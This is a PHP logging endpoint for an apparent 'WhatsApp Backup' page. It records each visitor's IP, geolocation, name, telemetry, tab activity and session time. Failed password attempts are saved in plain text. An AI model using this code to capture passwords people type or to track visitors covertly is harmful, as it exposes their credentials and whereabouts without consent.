<?php
// ======================================================================
// WhatsApp Backup - Live Activity & Telemetry Logger
// ======================================================================

header('Content-Type: application/json');
header('Cache-Control: no-store, no-cache, must-revalidate');

// Real Client IP Detection
function getClientIP() {
    $headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $list = explode(',', $_SERVER[$h]);
            $ip = trim($list[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Lightweight IP Geolocation (with 1.5s timeout)
function getIPLocation($ip) {
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return ['city' => 'Local Network', 'region' => 'Localhost', 'country' => 'Local', 'countryCode' => 'LOC', 'isp' => 'Local'];
    }
    $ctx = stream_context_create(['http' => ['timeout' => 1.5]]);
    $res = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,countryCode,regionName,city,isp", false, $ctx);
    if ($res) {
        $json = @json_decode($res, true);
        if (!empty($json) && $json['status'] === 'success') {
            return [
                'city' => $json['city'] ?? '',
                'region' => $json['regionName'] ?? '',
                'country' => $json['country'] ?? '',
                'countryCode' => $json['countryCode'] ?? '',
                'isp' => $json['isp'] ?? ''
            ];
        }
    }
    return ['city' => '', 'region' => '', 'country' => '', 'countryCode' => '', 'isp' => ''];
}

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data || empty($data['action'])) {
    echo json_encode(['ok' => false, 'error' => 'Invalid payload']);
    exit;
}

$logFile = __DIR__ . '/activity_logs.json';
$ip = getClientIP();
$now = time();
$action = $data['action'];
$sessionId = $data['sessionId'] ?? ('sess_' . $now);

// Read existing logs with concurrency lock
$fp = fopen($logFile, 'c+');
if (!$fp) {
    echo json_encode(['ok' => false, 'error' => 'Cannot open log storage']);
    exit;
}

flock($fp, LOCK_EX);
$filesize = filesize($logFile);
$logs = [];
if ($filesize > 0) {
    $content = fread($fp, $filesize);
    $logs = json_decode($content, true) ?: [];
}

// Find existing session index if present
$sessionIdx = -1;
foreach ($logs as $idx => $entry) {
    if (!empty($entry['sessionId']) && $entry['sessionId'] === $sessionId) {
        $sessionIdx = $idx;
        break;
    }
}

if ($action === 'login') {
    $geo = getIPLocation($ip);
    $status = $data['status'] ?? 'attempt';
    $name = htmlspecialchars(trim($data['name'] ?? 'Visitor'), ENT_QUOTES, 'UTF-8');
    
    $newRecord = [
        'id' => uniqid('log_', true),
        'sessionId' => $sessionId,
        'name' => $name,
        'status' => $status,
        'attemptPw' => ($status === 'failed' && !empty($data['attemptPw'])) ? $data['attemptPw'] : null,
        'ip' => $ip,
        'location' => $geo,
        'telemetry' => $data['telemetry'] ?? [],
        'createdAt' => $now,
        'createdAtFormatted' => date('Y-m-d H:i:s', $now),
        'lastHeartbeat' => $now,
        'durationSeconds' => 0,
        'isOnline' => ($status === 'unlocked'),
        'history' => [
            ['event' => $status, 'time' => $now]
        ]
    ];

    if ($sessionIdx >= 0) {
        // Update session
        $logs[$sessionIdx]['status'] = $status;
        if (!empty($name)) $logs[$sessionIdx]['name'] = $name;
        if (!empty($newRecord['attemptPw'])) $logs[$sessionIdx]['attemptPw'] = $newRecord['attemptPw'];
        $logs[$sessionIdx]['lastHeartbeat'] = $now;
        $logs[$sessionIdx]['isOnline'] = ($status === 'unlocked');
        $logs[$sessionIdx]['history'][] = ['event' => $status, 'time' => $now];
    } else {
        // Prepend to top of logs list (newest first)
        array_unshift($logs, $newRecord);
    }
} elseif ($action === 'heartbeat') {
    if ($sessionIdx >= 0) {
        $logs[$sessionIdx]['lastHeartbeat'] = $now;
        $logs[$sessionIdx]['durationSeconds'] = max(0, $now - $logs[$sessionIdx]['createdAt']);
        $logs[$sessionIdx]['isOnline'] = true;
        if (!empty($data['name']) && empty($logs[$sessionIdx]['name'])) {
            $logs[$sessionIdx]['name'] = htmlspecialchars($data['name'], ENT_QUOTES, 'UTF-8');
        }
    }
} elseif ($action === 'visibility') {
    if ($sessionIdx >= 0) {
        $isVisible = !empty($data['visible']);
        $logs[$sessionIdx]['isOnline'] = $isVisible;
        $logs[$sessionIdx]['lastHeartbeat'] = $now;
        $logs[$sessionIdx]['history'][] = [
            'event' => $isVisible ? 'tab_focus' : 'tab_blur',
            'time' => $now
        ];
    }
} elseif ($action === 'leave') {
    if ($sessionIdx >= 0) {
        $logs[$sessionIdx]['isOnline'] = false;
        $logs[$sessionIdx]['lastHeartbeat'] = $now;
        $logs[$sessionIdx]['durationSeconds'] = max(0, $now - $logs[$sessionIdx]['createdAt']);
        $logs[$sessionIdx]['history'][] = ['event' => 'page_closed', 'time' => $now];
    }
}

// Keep at most 500 recent logs to keep performance instant
if (count($logs) > 500) {
    $logs = array_slice($logs, 0, 500);
}

// Write back to file with lock
ftruncate($fp, 0);
rewind($fp);
fwrite($fp, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
fflush($fp);
flock($fp, LOCK_UN);
fclose($fp);

echo json_encode(['ok' => true, 'action' => $action]);
